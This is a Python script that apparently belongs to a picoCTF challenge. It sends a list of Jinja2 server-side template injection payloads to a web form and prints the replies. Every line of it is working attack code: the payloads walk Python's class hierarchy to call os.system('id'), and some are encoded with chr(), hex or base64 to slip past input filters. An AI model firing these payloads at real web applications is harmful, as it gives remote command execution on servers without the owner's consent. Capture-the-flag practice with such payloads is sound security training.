import requests
import time
import base64

# Target URL
URL = "http://shape-facility.picoctf.net:63433/"  # Change this to the actual target URL

# List of SSTI payloads
payloads = [
    "{{config}}",
    "{{config.__class__}}",
    "{{config.__class__.__mro__[1]}}",
    "{{config.__class__.__mro__[1].__subclasses__()}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{ ''.__class__.__mro__[1].__subclasses__()|list|join }}",
    "{{ ''.__class__.__mro__|map(attribute='__subclasses__')|list }}",
    "{{config.__class__.__mro__[1].__subclasses__()[138]['__call__']('__import__(\"os\").system(\"id\")') }}",
    "{{config.__class__.__mro__[1].__subclasses__()[138]|attr('__call__')('__import__(\"os\").system(\"id\")') }}",
    "{{ ''.__class__.__mro__[1].__subclasses__()[138][''.join([chr(95), chr(95), chr(105), chr(110), chr(105), chr(116), chr(95), chr(95)])]() }}",
    # Hex encoding
    "{{ ''.__class__.__mro__[1].__subclasses__()[138][chr(0x5f)+chr(0x5f)+chr(0x69)+chr(0x6e)+chr(0x69)+chr(0x74)+chr(0x5f)+chr(0x5f)]() }}",
    # Base64 encoded execution
    "{{ ''.__class__.__mro__[1].__subclasses__()[138]['__call__']('__import__(\"os\").system(__import__(\"base64\").b64decode(\"aWQ=\").decode())') }}",
    # Dynamic attribute access
    "{{ getattr(config.__class__.__mro__[1].__subclasses__()[138], '__call__')('__import__(\"os\").system(\"id\")') }}",
    # Using loop iteration to access methods
    "{% for item in config.__class__.__mro__[1].__subclasses__() %}{{ item }}{% endfor %}"
]

# Function to send requests
def test_payloads():
    for payload in payloads:
        data = {"input": payload}  # Adjust the parameter to match the form input name
        try:
            response = requests.post(URL, data=data, timeout=5)
            print(f"Payload: {payload}\nResponse: {response.text[:200]}\n{'-'*50}")
        except requests.exceptions.RequestException as e:
            print(f"Error with payload {payload}: {e}")
        time.sleep(1)  # Delay to avoid rate limiting

if __name__ == "__main__":
    test_payloads()
